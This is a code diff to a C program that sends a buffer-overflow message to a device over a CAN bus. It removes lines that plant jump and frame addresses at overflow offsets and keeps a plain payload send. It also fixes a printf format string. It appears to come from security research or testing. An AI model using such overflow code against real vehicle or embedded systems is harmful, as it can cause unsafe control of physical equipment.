@@ -47,20 +47,12 @@ int main(int argc, char *argv[])
 
     /* Send the buffer overflow message */
     char buffer[128];
-    memset(buffer, 0xb4, sizeof(buffer));
     memcpy(buffer, payload, sizeof(payload));
-    /* 64 bytes of regular buffer + 32 bytes after + 8 bytes for the address */
-    uint64_t addr = JUMP_ADDR;
-    memcpy(&buffer[OVERFLOW_PACKET_ADDR_IDX], &addr, sizeof(addr));
-    addr = FRAME_ADDR;
-    memcpy(&buffer[OVERFLOW_PACKET_FRAME_IDX], &addr, sizeof(addr));
-    size_t len = OVERFLOW_PACKET_SIZE;
-    printf("Sending jump, %u bytes long\n", len);
-    uint8_t res = send_can_message(sockfd, &servaddr, PGN, (void *)&buffer, len);
+    uint8_t res = send_can_message(sockfd, &servaddr, PGN, (void *)&buffer, sizeof(payload));
     if  (res > 0) {
         printf("OK\r\n");
     } else {
-        printf("Error: $u\r\n", res);
+        printf("Error: %u\r\n", res);
     }
 
     /* close and free */
